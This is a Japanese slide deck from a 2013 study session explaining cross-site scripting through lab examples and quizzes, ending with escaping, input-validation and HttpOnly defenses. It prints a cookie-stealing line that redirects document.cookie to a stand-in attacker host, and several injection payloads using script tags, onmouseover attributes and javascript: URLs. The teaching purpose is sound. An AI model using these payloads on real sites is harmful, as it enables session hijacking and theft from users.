# XSS

2013/11/17 @ 徳丸本勉強会

---

## XSS最初の体験

[ex00](https://github.com/laysakura/20131117-tokumaru-benkyokai/tree/gh-pages/sample-sites/attacker-sites/ex00_WhatIsXSS) のREADMEに従ってやります．

---

## [ex00](https://github.com/laysakura/20131117-tokumaru-benkyokai/tree/gh-pages/sample-sites/attacker-sites/ex00_WhatIsXSS) のXSS攻撃のまとめ

1. 攻撃者が
   <strong>脆弱サイト.com/status?uid=&lt;script&gt;*Javascript*&lt;/script&gt;</strong>
   というリンクを作る
1. 攻撃者がそのリンクをどこか(SNSとか)に貼る
1. 被害者がリンクを踏むと，脆弱サイトのCookie情報を(`GET`プロトコルで)持ちつつ攻撃者サイトにリダイレクトされる
1. 攻撃者サイトは被害者のCookie情報から脆弱サイトへのログインに必要な情報を得て，脆弱サイトに被害者として不正ログイン

---

## XSS攻撃が成立した理由

- `脆弱サイト.com/status` において，ユーザの入力値がエスケープなしに使用されていた

[Dispatcher.pm](https://github.com/laysakura/20131117-tokumaru-benkyokai/blob/gh-pages/sample-sites/vulnerable-sites/ex00_WhatIsXSS/lib/ex00_WhatIsXSS/Web/Dispatcher.pm)から抜粋
```perl
get '/status' => sub {
    my $c = shift;
    my $uid  = $c->req->param('uid');  # /status?uid=[ユーザ入力値]
    return $c->render('status.tx', {
        uid => $uid,
    });
};
```

[status.tx](https://github.com/laysakura/20131117-tokumaru-benkyokai/blob/gh-pages/sample-sites/vulnerable-sites/ex00_WhatIsXSS/tmpl/status.tx)から抜粋
```html
<dl>
  <dt>ID</dt>
  <dd><: $uid | mark_raw :></dd>  <!-- ここで < をエスケープしないといけない -->

  <dt>フォロワー数</dt>
  <dd>42</dd>
</dl>
```


## XSS攻撃が成立した理由

`<: $uid | mark_raw :>`の部分には`<script>`タグを入れることが可能なので，その中で**任意のJSコード**が実行されてしまう．


## XSS攻撃が成立した理由

今回の「任意のJSコード」は，以下のようなものだった．

1. 脆弱サイトのクッキーを取得する: `document.cookie`
1. それを攻撃者サイトに転送する: `window.location="http://攻撃者サイト.com/?cookie="+document.cookie`

---

# おわかりいただけただろうか?

---

## 今日やること

1. XSS最初の体験&解説
1. XSSの肝
1. クイズで覚える! パターン別XSS脆弱性対策
1. おまけ: HTMLエスケープ以外のXSS対策

---

# XSSの肝

---

## XSSの定義再考

XSSの定義 => ...?? 定義はなさそう．攻撃毎に「これってXSSだよね」って決まってる?

- 脆弱サイトと攻撃サイトの存在
- 悪意のあるコードの注入・実行を伴う

辺りが成立してればXSS?

---

## XSSの分解

1. 攻撃者が悪意のあるコードを脆弱サイトに注入
1. 被害者が攻撃者の注入したコードを脆弱サイトにて実行
1. (そのコードに応じて)何か嫌なことが起こる

---

## 攻撃者がコードを注入

- 反射型攻撃
  - 脆弱サイトにコードが永続的に残らない
  - 例: `GET`プロパティに`<script>`タグを埋め込んだリンクを踏ませる


## 攻撃者がコードを注入

- 持続型攻撃
  - 脆弱サイトにコードが永続的に残る
  - 例: 攻撃者が脆弱サイトのinputボックスに`<script>`タグを入力し，それが脆弱サイトのDBに保存され，以後誰のアクセスに対してもそのコードが実行される

---

## 被害者がコードを実行

- 反射型: リンク踏んだり
- 持続型: ページ表示したり

---

## (コードに応じて)何か嫌なことが起こる

- 被害者の持つ情報が盗まれる
  - Cookie ([ex00](https://github.com/laysakura/20131117-tokumaru-benkyokai/tree/gh-pages/sample-sites/attacker-sites/ex00_WhatIsXSS))
  - 個人情報，クレカ番号 ([ex01](https://github.com/laysakura/20131117-tokumaru-benkyokai/tree/gh-pages/sample-sites/attacker-sites/ex01_FormOverride))

- 脆弱サイトの改ざん
  - [ex01](https://github.com/laysakura/20131117-tokumaru-benkyokai/tree/gh-pages/sample-sites/attacker-sites/ex01_FormOverride) はある種の改ざんの例
  - 発信する情報の改ざん

- ...

---

## 個人情報を盗む例

- [ex01](https://github.com/laysakura/20131117-tokumaru-benkyokai/tree/gh-pages/sample-sites/attacker-sites/ex01_FormOverride)
- 攻撃にJSを使ってないのも面白い点

---

# クイズで覚える! パターン別XSS脆弱性対策

こっから↓キーで答え出ちゃうページあり

---

## ルール

- 空文字列を出力するアラートボックスを，ユーザ入力値の'工夫'によって出す
  - `alert('')`
  - それさえ出来れば，`window.location` によるリダイレクトなんかで攻撃者サイトに誘導することはできるので (see: [ex00](https://github.com/laysakura/20131117-tokumaru-benkyokai/tree/gh-pages/sample-sites/attacker-sites/ex00_WhatIsXSS))

注意: [ex01](https://github.com/laysakura/20131117-tokumaru-benkyokai/tree/gh-pages/sample-sites/attacker-sites/ex01_FormOverride) で見たのは`<form action="攻撃者サイト">`タグによる，JSを使わない攻撃だった．でも，JS使わない攻撃ができる部分ではJSを使った攻撃もできるので，**JSを使った攻撃に対する対処をマスターしとけばOK**

---

## 要素内容

問: `GET`のnameプロパティの値を工夫して，`alert('')`なアラートボックスを出せ
```html
<p>こんにちは，<?php echo $_GET['name']; ?>さん!!</p>
```


## 要素内容

答: name=**&lt;script&gt;alert('')&lt;/script&gt;**
```html
<p>こんにちは，<script>alert('')<／script>さん!!</p>
```

---

# 要素内容でのエスケープ

**要素内容(HTMLタグが書ける所)では，`<`, `&` をエスケープしよう**

- それぞれ `&lt;`, `&amp;` に
- `&` をエスケープする必要がある例 => http://shimax.cocolog-nifty.com/search/2007/12/php_f864.html

---

## 属性値(1)

問: アラートボックスを出せ
```html
<input type=text name=email
       value=<?php echo htmlspecialchars($_GET['email'], ENT_NOQUOTES); ?>
/>
```

(`<` はエスケープされている)


## 属性値(1)

答: email=**1 onmousover=alert('')**
```html
<input type=text name=email
       value=1 onmousover=alert('')
/>
```

ポイント: `<script>`タグを書かずとも実行可能なJSを埋め込めてる

---

## 属性値(2)

問: アラートボックスを出せ
```html
<input type=text name=email
       value="<?php echo htmlspecialchars($_GET['email'], ENT_NOQUOTES); ?>"
/>
```

(`1 onmousover=alert('')` では出ないよ)


## 属性値(2)

答: email=**" onmousover="alert('')**
```html
<input type=text name=email
       value="" onmousover="alert('')"
/>
```

---

## 属性値でのエスケープ

**属性値(HTMLタグのアトリビュート)は，`""` で囲った上で `"` をエスケープしよう**

---

## HTMLエスケープの基本の考え方

「現在の環境から深くも浅くも逃さない」

深く逃げられている例

name=**&lt;script&gt;alert('')&lt;/script&gt;**
```html
<p>こんにちは，<?php echo $_GET['name']; ?>さん!!</p>
```

浅く逃げられている例

email=**" onmousover="alert('')**
```html
<input type=text name=email
       value="<?php echo htmlspecialchars($_GET['email'], ENT_NOQUOTES); ?>"
/>
```

---

## その他の状況のHTMLエスケープ

問: アラートボックスを出せ
```html
<a href="<?php echo htmlspecialchars($_GET['link']); ?>">リンク</a>
```

(`<`, `"` はエスケープされている)


## その他の状況のHTMLエスケープ

答: email=**javascript:alert('')**
```html
<a href="javascript:alert('')">リンク</a>
```

「現在の環境から深くも浅くも逃さない」だけでは対処しきれていない例

---

## HTMLエスケープ，結局どうすれば...

徳丸本のp.106から読もう

---

# HTMLエスケープ以外のXSS対策

p.103から「保険的対策」として紹介されているもの

---

## 入力値検証

```html
<a href="javascript:alert('')">リンク</a>
```

の例みたいに，「うお，，エスケープ忘れてた，，，」みたいな事案は起きがち

- 入力すべき対象がわかっている場合は，それに使われる文字以外は打たせないなどの対策を
  - 例: メールアドレス記入欄で`[-_0-9a-zA-Z@.]`しか打たせない

---

## CookieにHttpOnly属性を付与

- XSSでありがちな被害は，悪意のあるJSコード注入によってCookieを盗み出されること
  - CookieをJSから読み取れないようにする

---

# 以上
